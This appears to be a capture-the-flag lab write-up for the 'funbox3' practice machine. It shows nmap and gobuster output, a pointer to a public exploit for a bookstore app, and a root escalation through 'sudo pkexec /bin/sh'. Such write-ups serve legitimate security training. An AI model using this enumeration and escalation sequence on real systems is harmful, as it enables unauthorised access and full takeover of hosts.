# NMAP
```
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBFf9aHhJU3GLUWqDvIV38olRMjbK+4e5i8pnIvPF9Qwn+ENXGyYDnDkzX0ZtH4B47hLgn9YNyI42G93vImly3EkYAfcOqoVLod8LkoofwfE++CXozZqV/itluReYeTJUqdS3kVartO4BP0E95qkTcX9DgdSxA8FsYlZqo7Y9sBW/ZuM6sQKwjQj24UvoCTa6XypoGb7CYm0+cmcUb0Z8sD934oLyhfBJUrTZW9/pJ/Cv7+l4BVBASwNHgdJd36aa7ktGRh6eq4cxgVU4lWNAONKzzSyusK1R4xZYDzACCMBM8RRLbTB9Q2lz/LzZOrMi/sFFvUrDVMIblUUZyoCr6eSPhq1spSrSEkG6im2yPRMT/VyNgnslr99m3peVLPG6hQxqaKfuImfNTF8OE8iPB7kbGnGxfX6eH39Jyhy0+bTqa4vMuhwvFZXiXRIeHVdtfmNK3tQ+Rl7V+3NELpVw0AJ3ZTSuqN8N1FagoEHrLmtScwHsrjGjv1gNoOr5VNMU=
|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBj3AVqceVrNYPKcj93yFU/eGll7QOs4iCDa6gan7lG6NzelFXpcJU7yWo4Jw/CGTKWryHjUnt//0/uu7c3Qs8g=
|   256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvJsP8vRVvuxGvwmEbZzieFB8s+azVy6fwOOQToDJ8I
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_gym
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
33060/tcp open  mysqlx? syn-ack ttl 63
```

# Gobuster
```
gobuster dir -u http://192.168.111.111 -w /opt/wordlists/dirb/big.txt -x php,html,txt -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.111.111
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /opt/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/11/30 15:32:59 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 318] [--> http://192.168.111.111/admin/]
/change-password.php  (Status: 302) [Size: 11239] [--> http://192.168.111.111/index.php]
/dashboard.php        (Status: 302) [Size: 10272] [--> http://192.168.111.111/index.php]
/forgot-password.php  (Status: 200) [Size: 2763]                                        
/header.php           (Status: 200) [Size: 1666]                                        
/index.php            (Status: 200) [Size: 3468]                                        
/index.html           (Status: 200) [Size: 10918]                                       
/logout.php           (Status: 200) [Size: 75]                                          
/profile.php          (Status: 302) [Size: 7247] [--> http://192.168.111.111/index.php] 
/registration.php     (Status: 200) [Size: 9409]                                        
/robots.txt           (Status: 200) [Size: 14]                                          
/robots.txt           (Status: 200) [Size: 14]                                          
/secret               (Status: 301) [Size: 319] [--> http://192.168.111.111/secret/]    
/server-status        (Status: 403) [Size: 280]                                         
/store                (Status: 301) [Size: 318] [--> http://192.168.111.111/store/]     
                                                                                        
===============================================================
2021/11/30 15:42:10 Finished
===============================================================
```

## Reverse Shell
http://[IP]/store/ is an online bookstore site. RCE exploit can be found on https://www.exploit-db.com/exploits/47887

## local.txt
Local.txt was found on /var/www/
```
ls -la /var/www
total 16
drwxr-xr-x  3 root     root     4096 Oct 30  2020 .
drwxr-xr-x 14 root     root     4096 Jul 30  2020 ..
drwxr-xr-x  6 root     root     4096 Jul 31  2020 html
-rw-r--r--  1 www-data www-data   33 Nov 30 08:35 local.txt
```

# PrivEsc
```
sudo -l
Matching Defaults entries for tony on funbox3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tony may run the following commands on funbox3:
    (root) NOPASSWD: /usr/bin/yelp
    (root) NOPASSWD: /usr/bin/dmf
    (root) NOPASSWD: /usr/bin/whois
    (root) NOPASSWD: /usr/bin/rlogin
    (root) NOPASSWD: /usr/bin/pkexec
    (root) NOPASSWD: /usr/bin/mtr
    (root) NOPASSWD: /usr/bin/finger
    (root) NOPASSWD: /usr/bin/time
    (root) NOPASSWD: /usr/bin/cancel
    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
    
tony@funbox3:~$ sudo -u root /usr/bin/pkexec /bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)

# ls -la /root
total 28
drwx------  3 root root 4096 Nov 30 08:35 .
drwxr-xr-x 20 root root 4096 Oct 30  2020 ..
-rw-------  1 root root    0 Oct 30  2020 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root   33 Nov 30 08:35 proof.txt
-rw-r--r--  1 root root   32 Oct 30  2020 root.flag
drwxr-xr-x  3 root root 4096 Jul 30  2020 snap
```
